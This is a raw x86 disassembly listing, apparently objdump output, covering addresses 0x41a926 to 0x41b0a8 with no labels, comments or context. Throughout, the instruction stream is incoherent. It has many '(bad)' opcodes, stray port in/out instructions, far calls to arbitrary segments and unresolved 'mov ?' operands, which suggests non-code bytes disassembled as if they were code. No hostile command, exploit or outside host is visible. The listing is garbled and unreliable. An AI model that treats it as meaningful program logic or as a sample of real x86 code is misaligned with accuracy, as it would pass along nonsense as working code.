  41a926:	jecxz  0x41a938
  41a928:	or     al,0xf9
  41a92a:	inc    ecx
  41a92b:	sbb    esi,edi
  41a92d:	mov    esp,0xd0524c15
  41a932:	ret    0x3a48
  41a935:	cld    
  41a936:	mov    eax,ds:0x53b93047
  41a93b:	pop    esp
  41a93c:	mov    eax,0x600ac9cc
  41a941:	and    eax,0x6dbd0527
  41a946:	sub    al,0x80
  41a948:	shl    DWORD PTR [edi],0xe4
  41a94b:	test   ah,ch
  41a94d:	add    dl,BYTE PTR [edx-0x17695661]
  41a953:	in     al,0x80
  41a955:	gs xchg edi,eax
  41a957:	mov    ebp,0xe2bf5108
  41a95c:	in     al,dx
  41a95d:	mov    ecx,eax
  41a95f:	mov    al,0x80
  41a961:	pop    ecx
  41a962:	push   es
  41a963:	jns    0x41a960
  41a965:	mov    BYTE PTR [ebp-0xc],0xb
  41a969:	adc    ebp,eax
  41a96b:	mov    eax,esi
  41a96d:	call   0x81d8e6a
  41a972:	push   0x16a77fc
  41a977:	xchg   ebx,eax
  41a978:	in     al,0xa1
  41a97a:	jo     0x41a96f
  41a97c:	mov    esp,0xe4990190
  41a981:	fcomp  DWORD PTR [esi+0x724289bd]
  41a987:	push   edi
  41a988:	retf   
  41a989:	in     al,0xba
  41a98b:	add    eax,ebx
  41a98d:	in     al,0x40
  41a98f:	dec    esi
  41a990:	push   ss
  41a991:	out    dx,eax
  41a992:	out    dx,al
  41a993:	mov    ebp,0x204c8534
  41a998:	das    
  41a999:	clc    
  41a99a:	mov    bh,0xf5
  41a99c:	and    DWORD PTR [edi-0x4178b1b8],ebp
  41a9a2:	xor    ah,0x2
  41a9a5:	in     al,0x5
  41a9a7:	xor    al,al
  41a9a9:	mov    ?,WORD PTR [esi-0xdf8de87]
  41a9af:	fidivr WORD PTR [esi-0x5d4547e0]
  41a9b5:	adc    DWORD PTR [edx+0x2],esi
  41a9b8:	in     eax,0xbe
  41a9ba:	and    esp,eax
  41a9bc:	fld    st(0)
  41a9be:	out    0xea,eax
  41a9c0:	sub    eax,0x223365c1
  41a9c5:	clc    
  41a9c6:	daa    
  41a9c7:	cmp    eax,0x8002000a
  41a9cc:	jg     0x41aa07
  41a9ce:	xor    eax,0xbe022d57
  41a9d3:	add    eax,0x271d1d0c
  41a9d8:	mov    ch,0xab
  41a9da:	outs   dx,BYTE PTR ds:[esi]
  41a9db:	mov    dh,0x13
  41a9dd:	clc    
  41a9de:	sub    eax,0x5cc7bffe
  41a9e3:	add    DWORD PTR [ecx],edi
  41a9e5:	sti    
  41a9e6:	out    dx,al
  41a9e7:	pxor   mm6,QWORD PTR [eax+0x23082db1]
  41a9ee:	je     0x41aa2f
  41a9f0:	dec    eax
  41a9f1:	je     0x41aa55
  41a9f3:	push   cs
  41a9f4:	or     esi,DWORD PTR [ebx+0x6180060d]
  41a9fa:	add    dh,BYTE PTR [edx]
  41a9fc:	lahf   
  41a9fd:	mov    bh,0x91
  41a9ff:	lods   eax,DWORD PTR ds:[esi]
  41aa00:	mov    ch,0x2b
  41aa02:	dec    eax
  41aa03:	adc    esp,eax
  41aa05:	dec    ecx
  41aa06:	cmp    edi,ebp
  41aa08:	add    cl,bh
  41aa0a:	jbe    0x41a9c7
  41aa0c:	and    BYTE PTR [esi-0x4ef64f54],bl
  41aa12:	add    ecx,ebx
  41aa14:	loopne 0x41aa2d
  41aa16:	sbb    ecx,eax
  41aa18:	or     ecx,DWORD PTR [eax+0x322f25b9]
  41aa1e:	or     DWORD PTR [edi],ebx
  41aa20:	lods   eax,DWORD PTR fs:[esi]
  41aa22:	mov    al,ds:0xf3a8a1f8
  41aa27:	gs clc 
  41aa29:	xchg   edi,eax
  41aa2a:	cld    
  41aa2b:	sub    eax,0xf4552f5b
  41aa30:	mov    eax,ds:0x829bf4b0
  41aa35:	xchg   ebp,eax
  41aa36:	xor    al,0xec
  41aa38:	add    al,0x4
  41aa3a:	cmc    
  41aa3b:	pop    es
  41aa3c:	nop
  41aa3d:	int    0x64
  41aa3f:	dec    ebx
  41aa40:	lock push eax
  41aa42:	mov    edx,0xc803a1ec
  41aa47:	out    dx,al
  41aa48:	xchg   edx,eax
  41aa49:	pusha  
  41aa4a:	in     al,dx
  41aa4b:	and    eax,0xade8bb20
  41aa50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa51:	cdq    
  41aa52:	in     al,0xa1
  41aa54:	int3   
  41aa55:	repz call 0x8619f8df
  41aa5b:	cmp    al,0x13
  41aa5d:	loopne 0x41aa83
  41aa5f:	xchg   edi,eax
  41aa60:	jmp    0x41aad5
  41aa62:	imul   BYTE PTR [esi]
  41aa64:	imul   esp,DWORD PTR [edx],0x5
  41aa67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa68:	and    ah,al
  41aa6a:	mov    edx,0xb5c0a648
  41aa6f:	adc    ebp,ebx
  41aa71:	push   eax
  41aa72:	adc    BYTE PTR [esi-0x49f5a30],cl
  41aa78:	(bad)  
  41aa79:	enter  0xcc7d,0xb
  41aa7d:	mov    DWORD PTR [ebp-0x30],ebx
  41aa80:	push   es
  41aa81:	aam    0xd1
  41aa83:	pop    ecx
  41aa84:	ss (bad) 
  41aa86:	mov    ds:0x98849ac4,al
  41aa8b:	(bad)  
  41aa8c:	fcom   st(1)
  41aa8e:	sahf   
  41aa8f:	mov    BYTE PTR [esi-0x24],ah
  41aa92:	enter  0xc057,0x65
  41aa96:	popf   
  41aa97:	inc    eax
  41aa98:	ss xchg edi,eax
  41aa9a:	cwde   
  41aa9b:	ror    BYTE PTR [edi+ebx*2],0x34
  41aa9f:	rcr    esi,0x8
  41aaa2:	xor    dl,BYTE PTR [esi]
  41aaa4:	push   esp
  41aaa5:	add    ah,BYTE PTR [ebp+0x1508bae0]
  41aaab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaac:	pusha  
  41aaad:	dec    eax
  41aaae:	fsubrp st(7),st
  41aab0:	or     DWORD PTR [ecx],eax
  41aab2:	in     al,dx
  41aab3:	pop    esp
  41aab4:	test   BYTE PTR [eax],bl
  41aab6:	scas   al,BYTE PTR es:[edi]
  41aab7:	in     al,0x1b
  41aab9:	push   ss
  41aaba:	shl    bl,0xc6
  41aabd:	sub    al,0x54
  41aabf:	sub    ebx,0xbc3f4d38
  41aac5:	inc    esp
  41aac6:	mov    bh,0x7
  41aac8:	je     0x41aad7
  41aaca:	fld    st(2)
  41aacc:	mov    edx,ecx
  41aace:	mov    edx,0x2810eb04
  41aad3:	shr    esp,1
  41aad5:	popa   
  41aad6:	or     dh,ah
  41aad8:	jmp    0x41ab0d
  41aada:	xlat   BYTE PTR ds:[ebx]
  41aadb:	inc    edx
  41aadc:	push   ds
  41aadd:	enter  0xe7c9,0xc6
  41aae1:	shr    DWORD PTR [ebx+esi*8+0x23],0xe4
  41aae6:	add    al,0x72
  41aae8:	push   eax
  41aae9:	mov    esp,0xc144c1cd
  41aaee:	pop    ebp
  41aaef:	add    al,0x13
  41aaf1:	add    ecx,0xa2378a00
  41aaf7:	fbstp  TBYTE PTR [eax+0x304c154]
  41aafd:	adc    al,0xc1
  41aaff:	lea    edi,[ebx]
  41ab01:	xchg   esp,eax
  41ab02:	cmp    DWORD PTR [eax+0x166f146d],0xf
  41ab09:	lahf   
  41ab0a:	ret    0x4f48
  41ab0d:	add    al,0xac
  41ab0f:	jge    0x41aaf4
  41ab11:	ja     0x41aac0
  41ab13:	xor    eax,0x65046f0c
  41ab18:	xor    bh,bh
  41ab1a:	test   BYTE PTR [ecx+0x78a9ad7f],al
  41ab20:	and    al,BYTE PTR ds:0xd93d368c
  41ab26:	mov    esi,DWORD PTR [ebp-0x2c]
  41ab29:	out    0x36,eax
  41ab2b:	test   BYTE PTR [eax],0x3
  41ab2e:	pushf  
  41ab2f:	(bad)  
  41ab30:	dec    ecx
  41ab31:	jne    0x41ab75
  41ab33:	pushf  
  41ab34:	xchg   BYTE PTR [edi+0x22],bh
  41ab37:	das    
  41ab38:	and    BYTE PTR ds:0xeb59ef28,0x62
  41ab3f:	push   esp
  41ab40:	mov    cl,0x7b
  41ab42:	outs   dx,DWORD PTR ds:[esi]
  41ab43:	add    cl,BYTE PTR [ecx+0x916828c]
  41ab49:	push   edx
  41ab4a:	dec    eax
  41ab4b:	sub    dl,BYTE PTR [edi]
  41ab4d:	inc    ecx
  41ab4e:	mov    ecx,0xfffcb1e0
  41ab53:	push   ebp
  41ab54:	jl     0x41ab74
  41ab56:	sub    al,0x27
  41ab58:	call   0xfcc7ab59
  41ab5d:	rcl    DWORD PTR [esi],1
  41ab5f:	jge    0x41ab2d
  41ab61:	mov    bh,0x5
  41ab63:	test   BYTE PTR [eax+0x1],0x20
  41ab67:	stos   DWORD PTR es:[edi],eax
  41ab68:	push   edi
  41ab69:	add    dl,0xd9
  41ab6c:	mov    bh,0xb0
  41ab6e:	xor    BYTE PTR [ecx],0x38
  41ab71:	adc    eax,0xad14d066
  41ab76:	adc    BYTE PTR [ecx],0xc7
  41ab79:	cmova  esp,DWORD PTR [ebx+0xd]
  41ab7d:	aam    0x6
  41ab7f:	dec    esp
  41ab80:	and    bh,dl
  41ab82:	xchg   ebp,eax
  41ab83:	das    
  41ab84:	(bad)  
  41ab85:	(bad)  
  41ab86:	push   ecx
  41ab87:	(bad)  
  41ab88:	in     al,dx
  41ab89:	inc    eax
  41ab8a:	je     0x41ab9f
  41ab8c:	and    al,0x34
  41ab8e:	add    BYTE PTR [ebx-0x4a],cl
  41ab91:	pop    ecx
  41ab92:	mov    dl,0xcd
  41ab94:	clc    
  41ab95:	jmp    0x41aba6
  41ab97:	adc    dl,BYTE PTR [eax]
  41ab99:	push   cs
  41ab9a:	clc    
  41ab9b:	push   ebp
  41ab9c:	out    dx,eax
  41ab9d:	pop    ecx
  41ab9e:	outs   dx,BYTE PTR ds:[esi]
  41ab9f:	movzx  eax,WORD PTR [eax]
  41aba2:	lock popf 
  41aba4:	add    eax,0x1dfb1b67
  41aba9:	or     ebp,DWORD PTR [ebx+0x43]
  41abac:	xor    edi,edi
  41abae:	lea    esi,[ebp-0x17e4393a]
  41abb4:	add    DWORD PTR [ebp+0x37057a21],edi
  41abba:	push   eax
  41abbb:	lea    eax,[edi+0x1]
  41abbe:	idiv   BYTE PTR [esi]
  41abc0:	jbe    0x41ab74
  41abc2:	mov    bh,al
  41abc4:	mov    ds:0x858d38c2,eax
  41abc9:	hlt    
  41abca:	adc    BYTE PTR [ebx],bl
  41abcc:	dec    esi
  41abce:	inc    bx
  41abd0:	push   eax
  41abd1:	lods   al,BYTE PTR ds:[esi]
  41abd2:	inc    eax
  41abd3:	xchg   ebp,eax
  41abd4:	and    DWORD PTR [ebx],ebp
  41abd6:	push   eax
  41abd7:	add    al,0x42
  41abd9:	and    eax,0xf661600
  41abde:	nop
  41abdf:	inc    edi
  41abe0:	test   cl,dl
  41abe2:	mov    eax,ds:0x754becbd
  41abe7:	sahf   
  41abe8:	jne    0x41ac04
  41abea:	inc    ebx
  41abeb:	inc    esi
  41abec:	inc    esi
  41abed:	add    eax,0x6359b602
  41abf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abf3:	or     ch,BYTE PTR [ebp-0x39]
  41abf6:	or     BYTE PTR [esi-0xcdb8d95],dh
  41abfc:	push   ebp
  41abfd:	and    eax,0x1bccb1af
  41ac02:	fnstenv [esi]
  41ac04:	sbb    BYTE PTR [ecx-0x7f],0x2a
  41ac08:	jae    0x41abf6
  41ac0a:	test   DWORD PTR ds:0xd81c82f7,ebp
  41ac10:	jbe    0x41ac6a
  41ac12:	push   ds
  41ac13:	or     dh,BYTE PTR [edi]
  41ac15:	popa   
  41ac16:	jae    0x41ac8e
  41ac18:	mov    ah,0x50
  41ac1a:	push   ebp
  41ac1b:	ss cld 
  41ac1d:	jne    0x41abd4
  41ac1f:	add    ebp,DWORD PTR [eax]
  41ac21:	mov    BYTE PTR [ecx],cl
  41ac23:	inc    eax
  41ac24:	in     al,0x9e
  41ac26:	in     al,0xf7
  41ac28:	sub    eax,0x2b83c280
  41ac2d:	push   edx
  41ac2e:	rcl    BYTE PTR [edi],0x4
  41ac31:	das    
  41ac32:	sti    
  41ac33:	(bad)  
  41ac34:	adc    al,0x73
  41ac36:	or     eax,0x5beb1f53
  41ac3b:	mov    ecx,0x7054fd04
  41ac40:	add    DWORD PTR [ebp+0xf],esi
  41ac43:	test   al,0x8d
  41ac45:	inc    ebx
  41ac46:	or     BYTE PTR [eax+esi*4+0x74],dl
  41ac4a:	and    eax,DWORD PTR [ebx+0x45]
  41ac4d:	adc    eax,0xbc2e0a01
  41ac52:	push   esp
  41ac53:	jl     0x41abf8
  41ac55:	or     BYTE PTR [esp+esi*1],bl
  41ac58:	idiv   cx
  41ac5b:	and    BYTE PTR [ebx+ebx*1-0x2c],dh
  41ac5f:	(bad)  
  41ac60:	or     al,BYTE PTR [ebx+0x24eb58b2]
  41ac66:	push   ecx
  41ac67:	mov    al,0x0
  41ac6a:	je     0x41ac9a
  41ac6c:	int    0xc
  41ac6e:	cmovne eax,eax
  41ac71:	outs   dx,BYTE PTR ds:[esi]
  41ac72:	mov    bl,BYTE PTR [ecx]
  41ac74:	and    al,0xeb
  41ac76:	or     ebx,DWORD PTR [ebp+eax*1+0x6f]
  41ac7a:	mov    ah,0x48
  41ac7c:	fwait
  41ac7d:	cmp    DWORD PTR [eax-0x73f98a41],esi
  41ac83:	ins    DWORD PTR es:[edi],dx
  41ac84:	cld    
  41ac85:	pop    esi
  41ac86:	push   cs
  41ac87:	cmp    eax,0x500bd4b3
  41ac8c:	mov    edx,0x54e48658
  41ac91:	gs lahf 
  41ac93:	mov    ah,0x9c
  41ac95:	fsubr  st(4),st
  41ac97:	mov    edi,cs
  41ac99:	inc    ecx
  41ac9a:	(bad)  
  41ac9b:	clc    
  41ac9c:	fimul  DWORD PTR [ecx-0x7b33bc5f]
  41aca2:	ins    BYTE PTR es:[edi],dx
  41aca3:	sub    al,0x9b
  41aca5:	add    ecx,DWORD PTR [eax+0x3f8c67b8]
  41acab:	xchg   ebp,eax
  41acac:	or     eax,0xe88f438b
  41acb1:	or     DWORD PTR [esp+eiz*2],ecx
  41acb4:	sub    ah,BYTE PTR [ebx+0x60]
  41acb7:	pop    esi
  41acb8:	mov    esp,ebx
  41acba:	sbb    DWORD PTR [eax+0x26],ecx
  41acbd:	fs fsub st(0),st
  41acc0:	call   0x23d3c5c8
  41acc5:	(bad)  
  41acc7:	sub    eax,0x491d22f0
  41accc:	std    
  41accd:	jl     0x41acd4
  41accf:	or     al,0xb1
  41acd1:	jle    0x41acb2
  41acd3:	idiv   BYTE PTR [eax]
  41acd5:	inc    eax
  41acd6:	je     0x41acc4
  41acd8:	outs   dx,BYTE PTR ds:[esi]
  41acd9:	mov    ebp,0x89750005
  41acde:	xchg   cl,bl
  41ace0:	nop
  41ace1:	lea    edx,[eax-0x47f503a6]
  41ace7:	test   ecx,esi
  41ace9:	neg    esi
  41aceb:	or     al,0x20
  41aced:	or     bl,BYTE PTR [ebp+0x29]
  41acf0:	mov    DWORD PTR [eax+0x8],edx
  41acf3:	xlat   BYTE PTR ds:[ebx]
  41acf4:	es fs jns 0x41ad56
  41acf8:	mov    ah,0x6c
  41acfa:	push   edx
  41acfb:	in     al,0xe8
  41acfd:	dec    esp
  41acfe:	enter  0x42c6,0xf6
  41ad02:	loopne 0x41acf0
  41ad04:	sbb    al,0x33
  41ad06:	mov    esp,0x26b13d91
  41ad0b:	call   DWORD PTR [ebp+0x38cf3fa4]
  41ad11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad12:	push   DWORD PTR [esp+ebx*4+0x5312eb8d]
  41ad19:	add    dl,al
  41ad1b:	out    dx,al
  41ad1c:	inc    eax
  41ad1d:	push   es
  41ad1e:	in     al,dx
  41ad1f:	nop
  41ad20:	or     al,0xb7
  41ad22:	mov    WORD PTR [ecx-0x27],es
  41ad25:	pop    eax
  41ad26:	adc    ah,bl
  41ad28:	xchg   edi,eax
  41ad29:	add    ecx,ebx
  41ad2b:	shl    bl,cl
  41ad2d:	push   esp
  41ad2e:	mov    al,ds:0xff3e1c93
  41ad33:	xchg   esi,eax
  41ad34:	xchg   ebx,eax
  41ad35:	xchg   ecx,eax
  41ad36:	cs push cs
  41ad38:	push   esi
  41ad39:	sbb    eax,0x6aff79ec
  41ad3e:	sub    ah,al
  41ad40:	imul   edx,DWORD PTR [edi],0xbd08d401
  41ad46:	test   al,0x15
  41ad48:	popa   
  41ad49:	and    dh,BYTE PTR [esi]
  41ad4b:	xchg   BYTE PTR [esp+edx*1],cl
  41ad4e:	pop    edi
  41ad4f:	ds cmp edi,edi
  41ad52:	add    DWORD PTR [ebx],edx
  41ad54:	mov    WORD PTR [ebx],di
  41ad57:	inc    esi
  41ad58:	aaa    
  41ad59:	retf   
  41ad5a:	shl    esp,cl
  41ad5c:	sbb    DWORD PTR [esi],ebp
  41ad5e:	adc    BYTE PTR [ecx-0x39],al
  41ad61:	adc    BYTE PTR [ecx-0x53059624],bh
  41ad67:	add    esi,0xffffff9a
  41ad6a:	(bad)  
  41ad6b:	mov    ds:0x352aebf8,al
  41ad70:	(bad)  
  41ad71:	pop    ss
  41ad72:	xor    al,0x54
  41ad74:	movups XMMWORD PTR [edx-0x68],xmm5
  41ad78:	rcl    DWORD PTR [eax-0x3909fa00],cl
  41ad7e:	sbb    BYTE PTR [eax+ebp*1-0x15],dh
  41ad82:	or     al,0x7a
  41ad84:	mov    cl,0x3f
  41ad86:	adc    BYTE PTR [ebx-0xcc444bd],dh
  41ad8c:	je     0x41adc4
  41ad8e:	lods   eax,DWORD PTR ds:[esi]
  41ad8f:	add    BYTE PTR [edx],ah
  41ad91:	and    ebx,ebx
  41ad93:	jne    0x41adbb
  41ad95:	mov    ah,0x6
  41ad97:	(bad)  
  41ad98:	cmp    eax,0x2af0006e
  41ad9d:	add    eax,0x156c0446
  41ada2:	cmp    BYTE PTR [esi+0xc0582ad],dl
  41ada8:	or     al,0x7a
  41adaa:	add    BYTE PTR [ebp+0x22],cl
  41adad:	mov    gs,WORD PTR [eax-0x4a]
  41adb0:	loopne 0x41ad75
  41adb2:	add    BYTE PTR [eax+0x1c],0xea
  41adb6:	cmp    ah,BYTE PTR [ebx+0x1c51cd25]
  41adbc:	sbb    DWORD PTR [ecx-0x5f],0xfc0c46ac
  41adc3:	fiadd  DWORD PTR [esi+0x660dcc1a]
  41adc9:	mov    edx,0x5b447a20
  41adce:	sbb    al,0xc8
  41add0:	inc    ax
  41add2:	mov    esi,DWORD PTR [edi]
  41add4:	inc    eax
  41add5:	hlt    
  41add6:	sbb    DWORD PTR [edx],0xffffffc9
  41add9:	add    DWORD PTR [edi],0x687c9637
  41addf:	push   ss
  41ade0:	mov    esp,0x93c8fa58
  41ade5:	or     DWORD PTR [ebx-0x3e],edi
  41ade8:	dec    esi
  41ade9:	push   esi
  41adea:	mov    eax,ds:0xde0b49b4
  41adef:	add    BYTE PTR [eax-0x30],ch
  41adf2:	mov    al,ds:0x4fcbd1f4
  41adf7:	je     0x41adff
  41adf9:	xor    ch,BYTE PTR [eax-0x14dca17d]
  41adff:	inc    edx
  41ae00:	std    
  41ae01:	adc    edi,esp
  41ae03:	add    esi,DWORD PTR ds:0x9bfc6817
  41ae09:	push   ecx
  41ae0a:	rol    bl,0x9a
  41ae0d:	sahf   
  41ae0e:	gs xchg edx,eax
  41ae10:	in     eax,dx
  41ae11:	jmp    0x41ae39
  41ae13:	and    al,dh
  41ae15:	lock hlt 
  41ae17:	jo     0x41ae6d
  41ae19:	test   BYTE PTR [esi],cl
  41ae1b:	pop    ecx
  41ae1c:	hlt    
  41ae1d:	add    eax,0x79a4a432
  41ae22:	or     BYTE PTR [ebx],ah
  41ae24:	add    ecx,ecx
  41ae26:	lock sub eax,0x2b60a919
  41ae2c:	psubsb mm0,mm3
  41ae2f:	or     eax,0xc70c4879
  41ae34:	leave  
  41ae35:	cmp    eax,0xe49d8363
  41ae3a:	sbb    ebx,esp
  41ae3c:	push   ss
  41ae3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae3e:	push   0x8
  41ae40:	fst    DWORD PTR [ebx+0x46]
  41ae43:	imul   eax,ebx,0x7e
  41ae46:	and    BYTE PTR [ecx-0x1f632244],ah
  41ae4c:	inc    ecx
  41ae4d:	adc    DWORD PTR [eax*1-0x72f8234f],esi
  41ae54:	cmc    
  41ae55:	jbe    0x41ae41
  41ae57:	xor    eax,0x379af891
  41ae5c:	push   es
  41ae5d:	mov    ecx,0xa84d7f2f
  41ae62:	push   cs
  41ae63:	adc    ch,BYTE PTR [eax]
  41ae65:	xor    ecx,DWORD PTR [eax]
  41ae67:	inc    ebx
  41ae68:	mov    BYTE PTR [ecx+ebx*4],dh
  41ae6b:	int3   
  41ae6c:	retf   
  41ae6d:	scas   eax,DWORD PTR es:[edi]
  41ae6e:	lods   al,BYTE PTR ds:[esi]
  41ae6f:	xchg   ebp,eax
  41ae70:	mov    edi,0xde90d933
  41ae75:	sbb    al,0xce
  41ae77:	inc    ebp
  41ae78:	mov    esp,0x42d00976
  41ae7d:	jle    0x41ae4b
  41ae7f:	xor    DWORD PTR [eax-0x427b1eb5],edi
  41ae85:	mov    BYTE PTR [ecx-0x4b],al
  41ae88:	sub    cl,dl
  41ae8a:	xchg   ebp,eax
  41ae8b:	sbb    ebp,esi
  41ae8d:	hlt    
  41ae8e:	rcr    DWORD PTR es:[edi+ebx*1+0x7],cl
  41ae93:	ret    0x490c
  41ae96:	mov    ?,WORD PTR [ecx]
  41ae98:	xor    cl,BYTE PTR [esp+eax*4]
  41ae9b:	mov    edx,0x584b57b8
  41aea0:	leave  
  41aea1:	xor    edx,ecx
  41aea3:	das    
  41aea4:	aas    
  41aea5:	jb     0x41aeab
  41aea7:	cmp    DWORD PTR [edx-0x3f9ebfde],ecx
  41aead:	adc    BYTE PTR [ebp*2-0x23afd478],ah
  41aeb4:	sub    cl,BYTE PTR [eax+0x7d8071f0]
  41aeba:	xchg   edx,eax
  41aebb:	pop    esp
  41aebc:	mov    dl,0x2d
  41aebe:	fist   DWORD PTR [ecx-0x7e]
  41aec1:	in     al,0xad
  41aec3:	and    BYTE PTR [edi*2-0x3474a560],bl
  41aeca:	adc    DWORD PTR [edi+ecx*1-0xb],eax
  41aece:	aam    0xac
  41aed0:	nop    DWORD PTR [eax-0x14]
  41aed4:	adc    esi,DWORD PTR [edx]
  41aed6:	ss popa 
  41aed8:	lods   eax,DWORD PTR ds:[esi]
  41aed9:	mov    ah,0x82
  41aedb:	in     al,0x8a
  41aedd:	xchg   esi,eax
  41aede:	xor    al,0x35
  41aee0:	imul   ebx,DWORD PTR [ecx-0x19],0xffffffd3
  41aee4:	push   cs
  41aee5:	loopne 0x41ae6d
  41aee7:	sbb    al,0x30
  41aee9:	jle    0x41aed4
  41aeeb:	iret   
  41aeec:	lea    esp,[eax+ebp*8+0xb]
  41aef0:	sub    al,0x87
  41aef2:	shl    BYTE PTR [esp+edx*1-0x2ac878f1],1
  41aef9:	call   0x51f6:0x9804b76d
  41af00:	dec    edx
  41af01:	retf   
  41af02:	add    edx,DWORD PTR [esi+0x7e]
  41af05:	ins    BYTE PTR es:[edi],dx
  41af06:	call   0xf5d4:0xb39969a6
  41af0d:	adc    cl,ah
  41af0f:	jmp    0x2ff514ae
  41af14:	or     eax,0xf5426cd
  41af19:	cld    
  41af1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af1b:	pop    ecx
  41af1c:	jle    0x41af1f
  41af1e:	add    ebp,DWORD PTR [edi-0x34]
  41af21:	mov    ah,BYTE PTR [esi-0x659eaa65]
  41af27:	rcr    edi,0xfa
  41af2a:	mov    ds:0xbe39b1ad,eax
  41af2f:	mov    edi,0xec3d8096
  41af34:	iret   
  41af35:	sti    
  41af36:	or     eax,0x8c50e5e0
  41af3b:	sbb    al,0x11
  41af3d:	dec    esp
  41af3e:	add    al,0x88
  41af40:	lds    ebx,FWORD PTR [edi+edx*2-0x59]
  41af44:	lock pop ss
  41af46:	loope  0x41af6f
  41af48:	ss (bad) 
  41af4a:	dec    eax
  41af4b:	in     al,dx
  41af4c:	fmul   DWORD PTR [edi]
  41af4e:	mov    edi,0xc6dc5382
  41af53:	sbb    ah,BYTE PTR [eax]
  41af55:	xchg   ebx,eax
  41af56:	xchg   ebp,eax
  41af57:	push   es
  41af58:	add    BYTE PTR [ecx],bl
  41af5a:	clc    
  41af5b:	sub    BYTE PTR [esi+0x16d97688],dh
  41af61:	push   ss
  41af62:	fld    TBYTE PTR [edi+eiz*2+0x45]
  41af66:	adc    al,0xb0
  41af68:	sti    
  41af69:	add    BYTE PTR [eax],ah
  41af6b:	hlt    
  41af6c:	or     DWORD PTR [eax+ecx*8],0xffffff81
  41af70:	(bad)  
  41af72:	lock ret 
  41af74:	mov    cl,0x7d
  41af76:	and    bh,bh
  41af78:	jae    0x41af86
  41af7a:	add    cl,BYTE PTR [eax]
  41af7c:	xchg   esi,eax
  41af7d:	jge    0x41af1a
  41af7f:	or     DWORD PTR [ebx-0x4e],ebx
  41af82:	mov    bh,0xd0
  41af84:	sbb    al,0xe8
  41af86:	mov    eax,0x81877208
  41af8b:	sub    al,0xe8
  41af8d:	retf   
  41af8e:	xchg   esi,eax
  41af8f:	fadd   DWORD PTR [ecx-0x4073f50f]
  41af95:	in     al,0x24
  41af97:	pop    edx
  41af98:	int    0x96
  41af9a:	dec    edx
  41af9b:	shl    DWORD PTR [esi-0x45],0x98
  41af9f:	cdq    
  41afa0:	in     al,dx
  41afa1:	or     ebx,ecx
  41afa3:	sbb    ah,al
  41afa5:	fmul   QWORD PTR [edi]
  41afa7:	mov    esi,0x64c8dcf0
  41afac:	dec    ebp
  41afad:	or     esi,DWORD PTR [eax-0x76]
  41afb0:	sbb    ebx,eax
  41afb2:	inc    eax
  41afb3:	sub    ebx,DWORD PTR es:[esp+edx*8-0x3b]
  41afb8:	sbb    dl,ah
  41afba:	mov    bl,0xb9
  41afbc:	sbb    ah,0x68
  41afbf:	xchg   ebp,eax
  41afc0:	jmp    0x90507195
  41afc5:	gs push esp
  41afc7:	lods   al,BYTE PTR ds:[esi]
  41afc8:	ror    ah,1
  41afca:	sbb    al,0xcd
  41afcc:	jo     0x41afde
  41afce:	mov    dl,0xcc
  41afd0:	cmp    bl,BYTE PTR [ecx-0xd]
  41afd3:	nop
  41afd4:	in     eax,dx
  41afd5:	pop    eax
  41afd6:	and    DWORD PTR [esi-0x38],0x3e
  41afda:	mov    ecx,0xfcc82904
  41afdf:	das    
  41afe0:	xor    al,0x91
  41afe2:	cld    
  41afe3:	jmp    0xcaff:0x660774c9
  41afea:	je     0x41affd
  41afec:	jmp    0x41b016
  41afee:	xchg   ebx,eax
  41afef:	shl    DWORD PTR [esi-0x30],0x53
  41aff3:	adc    dh,BYTE PTR [edi]
  41aff5:	(bad)  
  41aff6:	fadd   st(5),st
  41aff8:	inc    eax
  41aff9:	xchg   esi,eax
  41affa:	rol    ah,1
  41affc:	and    ecx,DWORD PTR [edi]
  41affe:	test   BYTE PTR [ebx],cl
  41b000:	call   0x2591:0x77708b78
  41b007:	(bad)  
  41b008:	mov    edi,0x3b67f879
  41b00d:	cmp    ecx,DWORD PTR ds:[eax+0x7f8501e4]
  41b014:	dec    eax
  41b015:	pop    esp
  41b016:	iret   
  41b017:	add    edx,ebx
  41b019:	dec    ebp
  41b01a:	mov    bl,0x6c
  41b01c:	xchg   esi,eax
  41b01d:	int    0xf0
  41b01f:	or     al,0xce
  41b021:	das    
  41b022:	push   edx
  41b023:	jno    0x41b072
  41b025:	mov    edx,0xce9036cb
  41b02a:	and    esp,DWORD PTR [ecx-0x2c9ab1f5]
  41b030:	xor    eax,0xdbbe1393
  41b035:	add    edi,eax
  41b037:	adc    eax,0x5ce1b0cf
  41b03c:	cdq    
  41b03d:	xor    ch,dh
  41b03f:	fst    DWORD PTR [edi+0x0]
  41b042:	mov    al,0x77
  41b044:	and    DWORD PTR [ebx-0x9433fb7],eax
  41b04a:	sbb    ecx,DWORD PTR [esi+eax*8+0x21]
  41b04e:	loope  0x41b00c
  41b050:	psubusw mm0,QWORD PTR [eax]
  41b053:	cmp    DWORD PTR [eax-0x7c9bcda4],edi
  41b059:	mov    eax,0xa3b4dd22
  41b05e:	sub    BYTE PTR [ebx+eax*4],ah
  41b061:	mov    ah,0x19
  41b063:	push   es
  41b064:	xor    cl,al
  41b066:	(bad)  
  41b067:	pop    esi
  41b068:	mov    al,0xb0
  41b06a:	or     DWORD PTR [ebx],ebx
  41b06c:	mov    ebx,cs
  41b06e:	push   ds
  41b06f:	lods   al,BYTE PTR ds:[esi]
  41b070:	pusha  
  41b071:	lods   al,BYTE PTR ds:[esi]
  41b072:	push   ds
  41b073:	cdq    
  41b074:	sar    DWORD PTR [esi+0x128b590f],0x10
  41b07b:	adc    BYTE PTR [eax+0x30642ea8],dh
  41b081:	pop    esp
  41b082:	sbb    al,0x4e
  41b084:	test   al,0xa4
  41b086:	out    dx,eax
  41b087:	inc    edx
  41b088:	push   cs
  41b089:	stc    
  41b08a:	jmp    0x2e79:0x1ca0a4be
  41b091:	in     al,0x90
  41b093:	mov    dh,0xa0
  41b095:	pushf  
  41b096:	mov    bh,0xce
  41b098:	cmp    BYTE PTR [edx],dh
  41b09a:	push   cs
  41b09b:	pushf  
  41b09c:	sbb    BYTE PTR [eax],al
  41b09e:	push   ebp
  41b09f:	cwde   
  41b0a0:	xchg   edi,eax
  41b0a1:	sbb    eax,0x98383064
  41b0a6:	jmp    0x41b110
  41b0a8:	rcl    BYTE PTR [ecx+eax*4+0x1b60c871],0x94
